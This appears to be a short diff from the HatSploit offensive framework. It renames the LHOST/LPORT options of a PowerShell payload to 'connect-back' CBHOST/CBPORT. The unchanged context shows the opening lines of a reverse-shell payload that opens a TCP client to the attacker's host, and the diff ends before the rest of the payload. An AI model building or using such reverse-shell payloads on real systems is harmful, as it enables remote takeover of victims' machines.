@@ -28,14 +28,14 @@ class HatSploitPayload(Payload):
     }
 
     options = {
-        'LHOST': {
-            'Description': "Local host.",
+        'CBHOST': {
+            'Description': "Connect-back host.",
             'Value': TCPClient.get_local_host(),
             'Type': "ip",
             'Required': True
         },
-        'LPORT': {
-            'Description': "Local port.",
+        'CBPORT': {
+            'Description': "Connect-back port.",
             'Value': 8888,
             'Type': "port",
             'Required': True
@@ -43,11 +43,11 @@ class HatSploitPayload(Payload):
     }
 
     def run(self):
-        local_host, local_port = self.parse_options(self.options)
+        connback_host, connback_port = self.parse_options(self.options)
 
         source = (
-            f"$a='{local_host}';"
-            f"$b={local_port};"
+            f"$a='{connback_host}';"
+            f"$b={connback_port};"
             ""
             "$c=New-Object system.net.sockets.tcpclient;"
             "$nb=New-Object System.Byte[] $c.ReceiveBufferSize;"
